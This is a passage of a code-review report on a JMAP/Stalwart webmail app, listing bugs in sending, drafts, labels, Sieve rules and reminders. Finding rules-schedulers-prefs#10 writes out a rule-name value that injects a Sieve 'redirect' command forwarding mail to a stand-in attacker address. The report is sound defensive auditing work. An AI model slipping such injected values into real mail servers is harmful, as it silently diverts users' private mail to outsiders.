**Description.** sendEmail (:274) and saveDraft (:389) put `destroy: [replaceDraftId]` in the same Email/set as the create. RFC 8620 §5.3 says the server keeps going after a rejected create and still runs the destroy. So when the create fails (overQuota, tooLarge, blobNotFound, invalidProperties), the last saved copy is deleted anyway. On that failure, sendEmail returns no draftId (:306-308), and saveDraft and scheduleSend (scheduled-send.ts:58-65, which is the default path while Undo send is on) don't either. The composer keeps its old draftId and its old lastSavedSnapshot, so the content looks saved when it no longer exists on the server. The send path could use EmailSubmission's onSuccessDestroyEmail. Drafts need the destroy to run only after the create has succeeded. Separately, unlike /api/discard, neither path checks that the id is really a $draft before destroying it.

**Failure scenario.** The account is at its quota. The user writes a reply, autosave stores D1, and after rereading for more than 10 seconds they click Send. The create in Scheduled fails with overQuota, but D1 is destroyed in the same Email/set. The user gets an error and clicks X. isDirty is false, since the snapshot matches the last autosave, so the composer closes without saving. The reply now exists nowhere.

**Evidence.**

```
email.ts:383-393 `create: { draft1: emailCreate }, ...(replaceDraftId && { destroy: [replaceDraftId] })`; :400-403 returns `{ success:false, error }` with no id; ComposerShell handleSend only updates draftId `if (result.draftId)`; closeComposer only saves `if (isDirty && hasContent())`.
```

### jmap-send-pipeline#4: Undo send can report 'Message sent' for a message that was cancelled but left in Scheduled

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/scheduled-send.ts:90`

**Description.** cancelScheduledSend deletes the SQLite row first. Then it makes unguarded JMAP calls (getMailboxes and the Email/set move, :97-106). If either throws (network blip, auth or method error), the route returns `{success:false, error}` with no `code` and status 500. outbox.ts undo() treats that as 'couldn't undo' and removes the id from `undone`. reportOutcome then GETs /api/scheduled/:id, which now returns 404 because the row is gone, and treats 404 as 'Message sent'. In fact nothing will ever send the message: it sits in Scheduled with no row. The same false 'sent' result happens whenever the worker drops a row without sending (`gone`, or Scheduled folder not found).

**Failure scenario.** The user clicks Undo during the 10 s window and the Mailbox/get in cancel times out. The user sees 'Couldn’t undo' and then 'Message sent'. The message was never sent and stays in Scheduled forever, and 'Cancel send' there now answers 'This message isn’t scheduled'.

**Evidence.**

```
scheduled-send.ts:90 `const row = cancelScheduledSendRow(...)` then :98 `await getMailboxes(...)` with no try/catch; api/scheduled/[emailId]/+server.ts:23-24 the catch returns no code; :10 `if (!row) return json({ error: 'Not scheduled' }, { status: 404 })`; outbox.ts reportOutcome: `if (res.status === 404) showToast({ message: 'Message sent' })`.
```

### jmap-send-pipeline#5: Deleting a label that has any messages always fails (onDestroyRemoveEmails:false means 'reject if non-empty')

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/jmap/labels.ts:160`

**Description.** The comment says `onDestroyRemoveEmails: false` 'detaches messages from the label without deleting them'. RFC 8621 §2.5 defines it the other way: when false, destroying a Mailbox that still has Emails is rejected with mailboxHasEmail. Stalwart follows this ('Mailbox is not empty'). So Settings → Labels → Delete only works on empty labels. Switching to true is not safe either: it would destroy messages that are only in that label. The fix is to first remove the label from every message (and re-home label-only messages), then destroy the mailbox.

**Failure scenario.** The user has a label 'Work' on 40 messages and deletes it in Settings. Mailbox/set returns notDestroyed {type:'mailboxHasEmail'}, /api/preferences/labels answers 400, and the label cannot be deleted until it is removed from all 40 messages by hand.

**Evidence.**

```
labels.ts:149-176 `destroy: [id], onDestroyRemoveEmails: false` with the comment 'detaches messages from the label without deleting them — they stay in Inbox/Archive/etc.'
```

### jmap-send-pipeline#6: Bulk actions send N (or 2N) JMAP requests at once, which can exceed Stalwart's concurrency limit and fail partway

- **Severity:** medium · **Kind:** performance · **Reviewer confidence:** medium
- **Location:** `src/routes/api/email/bulk/+server.ts:108`

**Description.** trash, 'delete forever', archive, markRead and markUnread run `Promise.all(ids.map(...))` with one request per id. trash and archive each cost an Email/get plus an Email/set per id, so 2N requests all start at the same moment. Stalwart advertises maxConcurrentRequests (default 4 per account), and requests over the limit are rejected with a limit error, which JMAPClient turns into a JMAPError. Promise.all then rejects on the first failure while the other requests carry on, so some messages are changed and others are not. The client ignores the response (EmailList.bulkAction never checks res.ok). Batched helpers already exist (moveEmails / updateEmailMailboxes do one get and one set), and markRead/unread or destroy can each be one Email/set.

**Failure scenario.** Select all 50 messages on a page and click Trash. That fires 100 simultaneous JMAP POSTs. Those beyond the concurrency limit fail, the route returns 500, the UI refreshes, and some of the selected messages are still in the Inbox with no error shown. Even with no limit, it costs 100 round trips where 2 would do.

**Evidence.**

```
bulk/+server.ts:108-114 `await Promise.all(ids.map((id) => ... trashEmail(client, accountId, id, ...)))`; :123-136 the same for markRead, markUnread and archive; moveEmails (email.ts:661) already batches.
```

### jmap-send-pipeline#7: Accounts with non-ASCII passwords cannot be linked (btoa vs Buffer encoding mismatch)

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/jmap/auth.ts:5`

**Description.** authenticate() builds the Basic header with `btoa(email:password)`. btoa only accepts Latin-1: it throws InvalidCharacterError for anything above U+00FF (Arabic, CJK, emoji), and it encodes Latin-1 letters like 'é' as a single byte instead of UTF-8. Every later request is built in authStateForAccount with `Buffer.from(...)`, which is UTF-8. linkAccount and reauthAccount verify through authenticate(), so linking fails. Arabic passwords get the misleading describeLinkError 'Unable to reach the mail server at … (Invalid character)', and accented ones get a 401 'Invalid credentials' even though the password is correct.

**Failure scenario.** A user whose Stalwart password contains Arabic letters (likely for this app) tries to link the account in /setup. btoa throws and the page says the mail server is unreachable. A password with 'é' gets 'Invalid credentials'.

**Evidence.**

```
auth.ts:5 `Basic ${btoa(`${email}:${password}`)}` vs accounts.ts authStateForAccount `Buffer.from(`${account.email}:${password}`).toString('base64')`; node: btoa('u@x:pé') = 'dUB4OnDp' but Buffer gives 'dUB4OnDDqQ=='; btoa('u@x:كلمة') throws InvalidCharacterError.
```

### jmap-send-pipeline#8: Legacy keyword-to-mailbox label migration skips messages, ignores failures, then marks itself done

- **Severity:** low · **Kind:** data-loss · **Reviewer confidence:** high
- **Location:** `src/lib/server/labels.ts:215`

**Description.** migrateEmailsForLabel pages through `Email/query {hasKeyword: old}` with `position += ids.length`. Each page's Email/set also removes that keyword, so the result set shrinks and the next position skips a full page. It also uses `mailboxIds/<id>` patch paths, which email.ts:563-575 documents as rejected by Stalwart 0.15–0.16.7 for all-digit ids (label mailboxes are the likely ones). The Email/set result is never checked. Either way, migrateKeywordLabelsIfNeeded then sets the 'v1' cookie and deletes the legacy cookie, so the skipped or rejected messages lose their label for good.

**Failure scenario.** A legacy label on 450 messages: page 1 migrates 200, the next query at position 200 sees only 250 left and returns 50, which is under PAGE so the loop ends. Only 250 of 450 are migrated (I simulated this with a vitest fake server), and the migration is recorded as complete.

**Evidence.**

```
labels.ts:189-216 `filter: { hasKeyword: oldKeyword }, position, ...` / `[`mailboxIds/${newMailboxId}`]: true, [`keywords/${oldKeyword}`]: null` / `await client.request([['Email/set', ...]])` (result unused) / `position += ids.length`.
```

### jmap-send-pipeline#9: Scheduled sends are silently dropped when the Scheduled folder can't be found

- **Severity:** low · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/scheduled-send.ts:194`

**Description.** deliver() finds the Scheduled folder by role, or by name 'Scheduled' at the root. If it isn't found, it calls removeScheduledSend: no error is recorded and the message is never sent. The webmail hides that folder from its own folder UI, but IMAP clients (Thunderbird, Apple Mail) can rename it or move it under a parent, and /api/folders would also allow it since it has no role. Every pending Send later message for the account is then quietly forgotten, and any undo outcome check reports 'Message sent'. Failing the rows with an error would make the problem visible.

**Failure scenario.** The user moves 'Scheduled' under 'Archive' in Thunderbird. At the next sweep every due row is deleted. The messages stay in Archive/Scheduled as drafts that never go out, and nothing tells the user.

**Evidence.**

```
scheduled-send.ts:192-197 `const scheduled = mailboxes.find(isScheduledMailbox); ... if (!scheduled) { removeScheduledSend(row.id); return; }`; mailbox.ts:63-65 isScheduledMailbox requires `parentId === null && name === 'Scheduled'` when there is no role.
```

### jmap-send-pipeline#10: Scheduled-send worker: transient JMAP method errors fail permanently, and no request timeout means one account stalls all sends

- **Severity:** low · **Kind:** improvement · **Reviewer confidence:** medium
- **Location:** `src/lib/server/scheduled-send.ts:219`

**Description.** Any JMAPMethodError marks the row 'failed' with no retry. The client.ts:53-56 comment says 'Retrying the same call won't help', but RFC 8620 §3.6.2 says serverUnavailable (and often serverFail) may succeed if retried later. Nothing notifies the user of a failed Send later, so a 3 a.m. scheduled message hit by a transient serverUnavailable just stays failed in Scheduled. Also, JMAPClient.request has no AbortSignal or timeout, and sweep() delivers every account's rows one at a time. A linked account whose server accepts connections but hangs blocks the worker for undici's default 300 s per request (three requests per row), which delays other accounts' Undo-send messages.

**Failure scenario.** Stalwart briefly answers serverUnavailable while restarting. Every Send later message due in that window is marked failed and needs a manual 'Try again' that the user may never see. Separately, a hung secondary server holds up the primary account's 10 s Undo send for minutes.

**Evidence.**

```
scheduled-send.ts:219-222 `if (err instanceof JMAPMethodError) { failScheduledSend(row.id, ...); return; }`; :161 `for (const row of claimDueSends()) await deliver(row);`; client.ts:16 `await fetch(this.apiUrl, { method: 'POST', ... })` with no signal.
```

### jmap-send-pipeline#11: The identity's Reply-To (and Bcc) is cached but never applied to outgoing mail

- **Severity:** low · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/jmap/email.ts:165`

**Description.** RFC 8621 §6.1 says the client SHOULD set the Identity's replyTo and bcc on Emails created from it. getIdentities keeps only `replyTo[0].email` and syncs it into SQLite, but buildEmailCreate never sets `replyTo`, and /api/send and /api/draft never pass it in. The identity's bcc is not even fetched. A Reply-To configured on an alias in Stalwart is ignored.

**Failure scenario.** The admin sets identity 'support@x' with Reply-To 'tickets@x'. A message sent from that identity has no Reply-To header, so customer replies go to support@x instead of the ticket queue.

**Evidence.**

```
identities.ts:40 `replyTo: i.replyTo?.[0]?.email ?? null`; buildEmailCreate (email.ts:165-219) sets from/to/cc/bcc/subject/body/attachments/sentAt/inReplyTo/references/importance only; send/+server.ts:62-73 builds compose without replyTo.
```

### jmap-send-pipeline#12: Removing a label from a message that is only in that label silently does nothing and reports success

- **Severity:** low · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/jmap/email.ts:614`

**Description.** updateEmailMailboxes refuses to leave a message with no mailbox by restoring the current set (`if (Object.keys(next).length === 0) Object.assign(next, cur)`). Then `changed` is false, no Email/set is sent, and no failure is recorded. removeLabel and /api/email/[id]/label therefore return {success:true} while the label stays. A message ends up label-only after 'Move to → <label>' (the FolderPicker offers labels), which removes it from Inbox.

**Failure scenario.** Use Move to → 'Work' on an Inbox message (it is now only in Work), then remove the Work label. The UI shows it removed and the API says success, but after a reload the label is back. Nothing explains why.

**Evidence.**

```
email.ts:610-619; checked with a vitest: removeLabel on {L1:true} issues only Email/get and resolves without error.
```

### jmap-send-pipeline: minor notes

- src/lib/server/scheduled-send.ts:146 wakeAt only sets a timer when the send is due within SWEEP_MS (15 s). With Undo send at 20 or 30 s the message goes out up to 15 s after the undo toast ends, and outbox.reportOutcome (its 5×2 s retries) may give up without saying anything.
- Cross-slice (root in ComposerShell.svelte:488): handleSend doesn't wait for an in-flight autosave (saveInFlight). The autosave can create D2 and destroy D1 while the send destroys D1, which leaves an orphan copy of the sent message in Drafts. Re-sending it from Drafts is a double send.
- Cross-slice (EmailDetail.svelte:366 handleEditDraft): fromIdentityId and importance are not restored, so a draft written from an alias is re-sent from the primary identity.
- src/lib/server/identity-resolve.ts:30-36: an unknown requestedId (for example a stale or other-account id after switching accounts with the composer open) silently falls back to the primary identity, so mail goes from a different address than the picker showed. Returning an error would be safer.
- src/lib/jmap/email.ts:409 destroyEmail ignores notDestroyed, so /api/discard and 'delete forever' in Trash report success even when the server refused.
- src/lib/jmap/email.ts:274/389: replaceDraftId is destroyed without the $draft check that /api/discard does. A client bug passing a real message id would permanently delete it.
- src/lib/jmap/folders.ts:11 validateFolderName doesn't reserve root names 'Scheduled', 'Remind Me Later' or 'Labels'. A new root folder with one of those names disappears from the sidebar's folder list and takes over that special folder (or turns its subfolders into labels).
- src/routes/(app)/email/[id]/+page.server.ts:14: getEmailDetail throws a plain Error('Email not found'), so a deleted or stale email link renders a 500 instead of a 404.
- src/routes/api/email/[id]/label/+server.ts:24-28 has no try/catch, so EmailUpdateError becomes a generic 500. It also doesn't check that labelId is really a label mailbox.
- src/routes/api/email/bulk/+server.ts:33 and src/routes/api/folders/+server.ts:53 cast the request body without validation (ids not an array, name not a string), which throws a TypeError and returns 500. Bulk 'archive' doesn't check for an empty ensureArchiveMailbox() result, unlike the single-email route.
- src/lib/jmap/client.ts:25 maps only 401 to JMAPAuthError (fetchSession also maps 403), and it discards the RFC 8620 request-level problem JSON (type/limit), so limit errors surface as a bare '400 Bad Request'.
- src/lib/server/db/queries/identities.ts:98-100: a sync with an empty remote list deletes every cached identity and all identity_signatures overrides in one go. Consider skipping the sync when Identity/get returns [].
- src/lib/server/db/queries/scheduled-sends.ts:70 recoverInterruptedSends resets all 'sending' rows at startup. If two processes share the DB (rolling container restart), a row still being submitted by the old process can be submitted again: a double send.
- src/lib/server/scheduled-send.ts:91-94: cancelling a row in 'sending' state answers 'Already sent' even though that send can still fail and end up 'failed'.
- src/lib/server/labels.ts:77 listLabels issues its own Mailbox/get through listLabelMailboxes, although the (app) layout has already fetched every mailbox in parallel. That is two Mailbox/get per navigation, adding to concurrent-request pressure.
- src/lib/server/compose-input.ts:11 parseAddresses doesn't check address syntax or reject CR/LF, and parseAttachments passes client 'type' and 'name' through unchanged. Worth hardening against header injection, even though only the user can send these values today.

## Slice: rules-schedulers-prefs

Files read: 55. Skipped: none.

### rules-schedulers-prefs#1: Reminder return uses mailboxIds/<id> pointer patches and ignores notUpdated, so reminders are silently dropped and the email stays in Remind Me Later

- **Severity:** high · **Kind:** data-loss · **Reviewer confidence:** high
- **Location:** `src/lib/server/reminder-scheduler.ts:85`

**Description.** returnReminder writes `mailboxIds/${rmlId}: null` and `mailboxIds/${original}: true`. The codebase documents in src/lib/jmap/email.ts:562-580 and rules-engine.ts:230-237 that this form is exactly what Stalwart v0.15.0-v0.16.7 rejects as "Invalid patch value" when the mailbox id is all digits. It also says late-created folders routinely get such ids, and the RML folder is created lazily on first snooze (ensureRemindMeLaterMailbox). Every other mailbox write was moved to updateEmailMailboxes (full mailboxIds object, which throws EmailUpdateError on failure); this is the one server path that was missed (`grep 'mailboxIds/${'` matches only this file and labels.ts). The Email/set result is never read. client.request only throws on method-level errors, not per-record notUpdated. So the code then calls markReturned and deleteReminder no matter what happened.

**Failure scenario.** On Stalwart 0.15-0.16.7 with an RML mailbox id like "9": the user snoozes an email until tomorrow 9am. At 9:00 the cron sends the pointer patch, Stalwart returns notUpdated{id: invalidPatch}, the code deletes the reminder row and writes a 'returned' marker. The email never comes back to the Inbox, nothing is logged, and the snooze is gone. The same silent drop happens on any server if the original folder was deleted meanwhile.

**Evidence.**

```
reminder-scheduler.ts:78-96: await client.request([[ 'Email/set', { update: { [id]: { [`mailboxIds/${rmlId}`]: null, [`mailboxIds/${r.original_mailbox_id}`]: true, 'keywords/$seen': null }}}]]); markReturned(...); deleteReminder(...);  // result never inspected
```

### rules-schedulers-prefs#2: Sieve compiles the 'Move to trash' action to `discard`, which permanently destroys incoming mail at delivery

- **Severity:** high · **Kind:** data-loss · **Reviewer confidence:** medium
- **Location:** `src/lib/server/sieve.ts:213`

**Description.** compileAction maps `delete` to `discard; stop;`. Sieve `discard` silently throws the message away; it never reaches Trash. The editor labels this action "Move to trash" (settings/rules/+page.svelte:648), and the app engine does move to Trash (rules-engine.ts:192-196). persistAll deploys and activates the script on every save, toggle, create and delete (+page.svelte:74, deploy/+server.ts:94-105), and the auto-reply page deploys it too. rules-scheduler.ts:18-19 says only that Stalwart 'on this deployment' doesn't run user Sieve. On a stock Stalwart, which runs the active user script at delivery, this rule deletes mail permanently and unrecoverably. `stop` also skips all later rules, which the engine doesn't do for delete.

**Failure scenario.** A user of the open-source release on a stock Stalwart saves the rule 'From contains newsletter -> Move to trash'. The deploy succeeds, so no warning appears. From then on every matching message is discarded at SMTP delivery, never shown in Trash, and can't be recovered. A slightly-too-broad condition, e.g. 'Has attachment' (see the multipart finding), loses large amounts of real mail.

**Evidence.**

```
sieve.ts:213  case 'delete':         return `discard; stop;`;
+page.svelte:648  <option value="delete">Move to trash</option>
```

### rules-schedulers-prefs#3: "Save & apply now" runs the rule's actions on a different set of emails than the rule matches (approximate JMAP filter, inverted negation, whole-account scope)

- **Severity:** high · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/routes/api/rules/apply/+server.ts:198`

**Description.** The apply endpoint turns each rule into a JMAP filter with buildJmapFilter and then runs the actions on every hit, without re-checking ('pre-filtered, so every row matched'). That filter was written as a rough preview approximation (rules.ts:9-13 says 'fall back to contains so the preview count stays in the right ballpark. Sieve still enforces exact-match semantics'). It disagrees with the engine in several confirmed ways: (1) is/starts_with/ends_with become contains; (2) conditionToFilter applies NOT when `c.negate || c.op === 'not_contains'`, so NOT plus "doesn't contain" (both selectable in the UI) is a single NOT, while the engine and Sieve treat it as a double negative (contains); (3) for size and hasAttachment the engine and Sieve ignore `op`, but the filter still inverts on a stale hidden op 'not_contains', which survives when the user switches the field dropdown from From to Has attachment/Size; (4) the query has no inMailbox limit, so it also hits Sent, Drafts, Junk and Trash, while auto-apply only processes the Inbox. Verified in the scratch copy: subject not_contains+negate 'hello' gives engine=fires, filter={NOT subject:hello}; hasAttachment with hidden op not_contains gives engine=fires, filter={NOT hasAttachment}.

**Failure scenario.** Rule 'Has attachment -> Move to trash', where the condition was first 'From doesn't contain …' and then switched to Has attachment. Save & apply now trashes every email in the account that has NO attachment, across all folders, and trash retention then destroys them. Another case: 'Subject starts with "[JIRA]" -> Delete' also trashes every reply or forward that merely contains [JIRA].

**Evidence.**

```
rules.ts:35-36 const negated = c.negate || c.op === 'not_contains'; return negated ? { operator: 'NOT', conditions: [base] } : base;
apply/+server.ts:175 ['Email/query', { accountId, filter, position, limit: PAGE }, 'q']  // no inMailbox
apply/+server.ts:198 matched += emails.length; // pre-filtered, so every row matched
```

### rules-schedulers-prefs#4: Engine's 'is' / 'starts with' on From/To compare against the joined "name email" string, so 'From is exactly a@b.com' never fires for senders with a display name

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/rules-engine.ts:84`

**Description.** For from/to, exactValue builds the haystack with addressText(), which joins every address as `${name} ${email}`. It then does `hay.trim() === needle` for 'is' and `hay.startsWith(needle)` for 'starts_with'. Almost all real senders have a display name, so 'is exactly alice@example.com' is compared against 'alice smith alice@example.com' and fails. 'To is me@x' fails whenever there is more than one recipient. Verified: from-is=false, from-starts_with 'alice@'=false, to-is=false; only a sender with no display name matches. Sieve has the same gap (`header :is "From"` compares the raw 'Alice <alice@…>' header; `address :is :all` would be correct). The apply-to-existing path uses 'contains', so the rule appears to work when applied by hand but never fires on new mail.

**Failure scenario.** The user writes 'From is exactly boss@company.com -> Mark important'. Save & apply now flags the existing mail (contains filter), but every new mail from 'Boss Name <boss@company.com>' is ignored by the scheduler and the Jev worker, with no error.

**Evidence.**

```
rules-engine.ts:38-41 addrs.map((a) => `${a.name ?? ''} ${a.email}`).join(' ')
rules-engine.ts:84-85 case 'is': res = hay.trim() === needle; case 'starts_with': res = hay.startsWith(needle);
```

### rules-schedulers-prefs#5: The 'a Jev rule never deletes' guard can be bypassed with 'Move to folder → Trash', which trash retention then makes permanent

- **Severity:** medium · **Kind:** data-loss · **Reviewer confidence:** high
- **Location:** `src/lib/types/rules.ts:119`

**Description.** effectiveActions removes only `delete` from rules with a Jev condition, because a misjudged delete becomes permanent once Trash empties itself. The editor offers the Trash mailbox as a 'System' target for 'Move to folder' (+page.svelte:35 includes role 'trash', 682-688), and that option is not hidden for Jev rules. applyActionsToOutcome then adds the Trash id and removes Inbox (rules-engine.ts:184-190). trash-retention.ts later destroys anything in Trash (or Trash plus labels) after the period. The Junk target is a similar soft-delete. Verified: a Jev rule with moveToFolder 'trash' gives add=[trash], remove=[inbox].

**Failure scenario.** A user makes the Jev rule "it's a newsletter -> Move to folder: Trash" (the delete option is hidden, so this looks like the way to do it). Jev misclassifies a few real emails at 0.8 confidence. Seven days later the trash sweep destroys them permanently, which is exactly what the guard was meant to prevent.

**Evidence.**

```
types/rules.ts:118-120 const actions = hasJevCondition(rule) ? rule.actions.filter((a) => a.type !== 'delete') : rule.actions;
+page.svelte:35 data.mailboxes.filter((m) => m.role === 'archive' || m.role === 'junk' || m.role === 'trash')
```

### rules-schedulers-prefs#6: Reminder return never checks that the email is still in Remind Me Later, so snoozed mail the user trashed or archived comes back to the Inbox as unread

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/reminder-scheduler.ts:78`

**Description.** Reminder rows are cancelled only through DELETE /api/reminders/[id] (the Unsnooze button). Trashing, archiving or moving a snoozed email leaves the row in place. When it comes due, returnReminder adds original_mailbox_id and clears $seen unconditionally, wherever the email now lives. A trashed email ends up in Trash and Inbox. The trash-retention sweep then counts the Inbox as 'filed elsewhere' (trash-retention.ts:131-132), takes it out of Trash and keeps it.

**Failure scenario.** The user snoozes an email to next week, then deletes it from the Remind Me Later folder. Next week it reappears in the Inbox as unread (and is also in Trash). Archived snoozed mail is likewise copied back into the Inbox.

**Evidence.**

```
reminder-scheduler.ts:83-88 update: { [r.jmap_email_id]: { [`mailboxIds/${rmlId}`]: null, [`mailboxIds/${r.original_mailbox_id}`]: true, 'keywords/$seen': null } }  // no check that rmlId is in the email's mailboxIds
```

### rules-schedulers-prefs#7: Cancelling 'Apply rule' in the UI doesn't stop the server; every page is still processed

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/routes/api/rules/apply/+server.ts:46`

**Description.** The SSE ReadableStream has no cancel() handler and start() never checks for disconnect or abort. send() swallows the enqueue error after the client goes away, so the loop keeps paging and sending Email/set batches until it finishes (up to 10,000 pages of 200). The editor shows a Cancel button (closeOrCancel aborts the fetch, +page.svelte:422-426), which suggests the operation can be stopped.

**Failure scenario.** The user starts 'Save & apply now' on an over-broad delete rule, sees 'of 40,000' and presses Cancel at once. The modal closes, but the server keeps trashing all 40,000 matches.

**Evidence.**

```
apply/+server.ts:46-52 const send = (data) => { try { controller.enqueue(...) } catch { /* Controller closed mid-flight (client disconnected). */ } };  // loop continues; no cancel() / signal check
```

### rules-schedulers-prefs#8: Sieve 'Has attachment' test matches every multipart message, including ordinary HTML mail

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/sieve.ts:157`

**Description.** hasAttachment compiles to `header :contains "Content-Type" "multipart"`. That is true for multipart/alternative, which is nearly every HTML email, and for multipart/related. The app engine and JMAP use the real hasAttachment flag. If the deployed script runs, an attachment rule hits most mail. Together with the delete→discard mapping, this silently destroys most incoming HTML mail.

**Failure scenario.** The rule 'Has attachment -> Move to folder: Attachments' is deployed to a Stalwart that runs user Sieve. Most newsletters and normal HTML mail are filed into Attachments at delivery and never appear in the Inbox.

**Evidence.**

```
sieve.ts:156-157 case 'hasAttachment': test = `header :contains "Content-Type" "multipart"`;
```

### rules-schedulers-prefs#9: Rules save, deploy and apply act on whichever account the cookie currently selects, so a stale tab overwrites another account's rules

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** medium
- **Location:** `src/routes/api/preferences/rules/+server.ts:14`

**Description.** The rules editor loads account A's rules and mailbox ids, but POST /api/preferences/rules, /api/rules/deploy and /api/rules/apply carry no account id. They resolve the target from locals.auth, i.e. the shared `active_account` cookie. If the account is switched in another tab, the next save in the editor (toggle, create or delete all autosave) replaces account B's whole rules array with A's rules, deploys A's Sieve script to B, and 'apply now' runs A's markRead/delete rules over B's mailbox. localRules is initialised once and isn't re-derived on invalidateAll, so the stale page keeps doing this. Nothing notifies other tabs of an account switch (no BroadcastChannel).

**Failure scenario.** Tab 1 has Settings → Rules open for work@. In tab 2 the user switches to personal@. Back in tab 1 they toggle a rule: personal@'s rules are replaced by work@'s (with work@ mailbox ids, now shown as stale), and the original personal@ rules are lost for good.

**Evidence.**

```
preferences/rules/+server.ts:14-16 const userEmail = userEmailFromAuth(locals.auth); ... saveRules(userEmail, Array.isArray(rules) ? rules : [], cookies);
+page.svelte:22 let localRules = $state<Rule[]>(structuredClone(data.rules ?? []));
```

### rules-schedulers-prefs#10: Rule names are written into Sieve comments unescaped, so a newline lets the name inject Sieve commands; :matches wildcards are not escaped either

- **Severity:** low · **Kind:** security · **Reviewer confidence:** high
- **Location:** `src/lib/server/sieve.ts:115`

**Description.** `# Rule: ${rule.name}` (and the Jev variant at line 105) put the raw name into a line comment. A name containing a newline ends the comment, and the rest compiles as Sieve. Verified: the name 'x\nredirect "attacker@example.com";\n#' produces a live `redirect` line; redirect is a core command and needs no require. The <input> strips newlines, but POST /api/preferences/rules accepts arbitrary JSON (as does the legacy cookie import), so the only protection is the client. Separately, starts_with/ends_with use `:matches` with only quote/backslash escaping, so values containing * or ? act as wildcards, unlike the engine's literal match.

**Failure scenario.** A rule saved through the API, a scripted import or a buggy client with a multi-line name deploys a script that forwards or discards mail with commands the user never wrote.

**Evidence.**

```
sieve.ts:115 lines.push(`# Rule: ${rule.name}`);  →  output: '# Rule: x\nredirect "attacker@example.com";\n#'
sieve.ts:170 `${type} :matches "${header}" "${v}*"`
```

### rules-schedulers-prefs#11: Cancelling a reminder deletes the row before moving the email back, so a failed move strands the email in Remind Me Later

- **Severity:** low · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/routes/api/reminders/[emailId]/+server.ts:19`

**Description.** cancelReminder() deletes the DB row first. Then ensureRemindMeLaterMailbox and moveEmail run, and either can throw: EmailUpdateError if the original folder was deleted, or a network or JMAP error. The handler returns 500, but the reminder is already gone, so the email sits in RML with no reminder and retrying 'Unsnooze' returns 404. The client (EmailRowActions.svelte:67) doesn't check the response either.

**Failure scenario.** The user snoozes from a folder, deletes that folder, then clicks Unsnooze. moveEmail throws (invalid mailbox), the row is already deleted, and the email stays in Remind Me Later for good with no reminder.

**Evidence.**

```
[emailId]/+server.ts:19 const row = cancelReminder(userEmail, params.emailId);  // DELETE happens here
:26 await moveEmail(client, ..., row.original_mailbox_id, rmlId);  // may throw afterwards
```

### rules-schedulers-prefs#12: Notification folders (and folder-expand state) are stored per login but hold per-account mailbox ids, so they leak across linked accounts

- **Severity:** low · **Kind:** bug · **Reviewer confidence:** medium
- **Location:** `src/routes/api/preferences/notifications/+server.ts:23`

**Description.** notification_folders lives in app_prefs, keyed by app_user, but holds JMAP mailbox ids, which are only unique within one account. Stalwart numbers mailboxes per account (every inbox is 'a', and so on). The push worker keeps any stored id that exists in the current account (push/worker.ts:219-223) on the assumption that ids are globally unique. So a folder picked in account A turns on notifications for an unrelated folder with the same id in account B, and also replaces B's Inbox default. folder_expanded has the same issue (cosmetic only).

**Failure scenario.** In work@ the user picks only 'Clients' (id 'f') for notifications. In personal@ the folder with id 'f' (say 'Newsletters') now triggers desktop notifications, and personal@ Inbox mail no longer does.

**Evidence.**

```
notifications/+server.ts:23 patch.notification_folders = JSON.stringify(body.folders);  // stored per user, not per account
push/worker.ts:222 picked = parsed.filter((id) => this.mailboxes!.ids.has(id));
```

### rules-schedulers-prefs#13: Page size is stored as a string, so Settings always shows 50 after reload; export/import also drops it and doesn't include rules despite saying it does

- **Severity:** low · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/routes/api/user-state/settings/+server.ts:47`

**Description.** PATCH /api/user-state/settings stores every value with String(value), commented 'so a numeric page size round-trips cleanly'. settings/messages/+page.svelte:20-23 only shows the stored value when `typeof defaultPageSize === 'number'`, so after a reload the select always reads 50 even though the lists use the saved value (app-prefs.ts:155-158 parses it). This appeared when settings moved from user_settings JSON to string-only app_prefs. Also, PREF_KEYS (preferences.ts:20-46) lacks defaultPageSize: export includes it (getPrefs dumps everything), but import drops it. The import/export page lists `mail_rules` as exported, but rules live in user_rules and are never exported, so a user relying on the backup loses their rules.

**Failure scenario.** The user sets 25 rows per page. Lists use 25, but Settings → Messages shows 50 after any reload. Exporting and importing on a new install loses the page size and every rule.

**Evidence.**

```
user-state/settings/+server.ts:47 if (value !== null && value !== undefined) patch[key] = String(value);
settings/messages/+page.svelte:21 typeof $userState.settings.defaultPageSize === 'number' ? ... : 50
```

### rules-schedulers-prefs: minor notes

- src/routes/(app)/settings/rules/+page.svelte:69 — persistAll ignores the POST /api/preferences/rules status. On a 401 or 500 the UI still says 'Rules saved. Delivery-time (Sieve) deploy failed…' even though nothing was saved. Concurrent persistAll calls from quick toggles are also not serialised, so an older snapshot can land last.
- src/routes/api/preferences/rules/+server.ts:16 — rules are stored with no shape validation. One malformed entry (e.g. [null] or a rule with no conditions) makes getRules(...).filter(r => r.enabled) / rulesNeedBody throw on every tick, so auto-apply for that account silently stops (only a console error).
- src/lib/server/rules-scheduler.ts:165-166 — on a full page the cursor becomes the last receivedAt, and JMAP `after` is inclusive. If 100 or more inbox messages share one receivedAt second (bulk import), the same page is re-read forever and rules stop advancing for that account.
- src/lib/server/rules-scheduler.ts:74 — the cursor is the app server's clock, compared with the mail server's receivedAt. If the mail host's clock lags, mail delivered in that gap is skipped. Mail moved or restored into the Inbox with an old receivedAt is never processed.
- src/lib/server/rules-engine.ts:184-196 — when one rule does moveToFolder X and another does delete, the result is X + Trash. The trash sweep treats X as 'filed elsewhere' and only untrashes, so the delete is silently undone.
- src/lib/server/trash-retention.ts:99-102 — a message restored and re-trashed between two hourly sweeps keeps its first stamp and can be destroyed long before the full period after the second trashing.
